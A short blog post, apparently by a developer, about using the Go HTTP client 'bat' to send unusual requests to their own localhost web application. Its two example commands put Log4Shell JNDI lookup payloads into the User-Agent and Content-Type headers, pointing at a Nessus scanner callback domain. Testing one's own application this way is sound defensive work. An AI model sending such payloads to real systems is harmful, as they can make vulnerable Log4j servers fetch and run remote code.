    <p>A few days ago I need to to craft some non standard http requests and
send them to our web application. I’ve used <code class="language-plaintext highlighter-rouge">httpie</code> in the past, but wanted 
to try something different. Given that golang clients would have all the 
deps bundled I figured I’d check if there were any good projects on github. 
I found <a href="https://github.com/astaxie/bat">bat</a> that was really easy to install 
and worked great. Turns out it was actually inspired by <code class="language-plaintext highlighter-rouge">httpie</code></p>

<p><code class="language-plaintext highlighter-rouge">go install github.com/astaxie/bat@latest</code></p>

<p>Then was off to the races:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat localhost:3000 User-Agent:"\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}" Content-Type:application/html
bat localhost:3000 Content-Type:"\${jndi:ldap://log4shell-generic-HJRowHlwCKDBn2GuIMz7\${lower:ten}.w.nessus.org/nessus}"
</code></pre></div></div>

<p>Will definitely be using this again in the future.</p>
